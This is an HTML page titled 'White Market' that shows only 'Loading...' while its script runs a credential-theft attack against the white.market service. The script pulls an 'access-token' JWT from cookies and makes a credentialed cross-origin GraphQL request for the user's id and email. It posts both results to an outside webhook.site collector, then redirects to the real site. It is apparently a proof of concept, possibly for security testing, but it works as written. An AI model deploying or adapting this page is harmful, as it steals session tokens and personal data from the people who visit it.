<!DOCTYPE html>
<html>
<head><title>White Market</title></head>
<body>
<h1>Loading...</h1>
<script>
// Method 1: Try direct cookie theft (probably won't work)
const localCookies = document.cookie;
if (localCookies.includes('access-token')) {
    const jwt = localCookies.split(';').find(c => c.includes('access-token')).split('=')[1];
    fetch('https://webhook.site/ca40a8c2-76e4-4463-97f8-b46cddb37a84', {
        method: 'POST',
        body: JSON.stringify({method: 'direct', jwt: jwt})
    });
}

// Method 2: CORS attack to make authenticated request
fetch('https://api.white.market/graphql/api', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        query: 'query{user{id email}}',
        operationName: 'GetUser'
    })
})
.then(r => r.json())
.then(d => {
    fetch('https://webhook.site/ca40a8c2-76e4-4463-97f8-b46cddb37a84', {
        method: 'POST',
        body: JSON.stringify({method: 'cors', data: d})
    });
});

setTimeout(() => window.location.href = 'https://white.market', 3000);
</script>
</body>
</html>
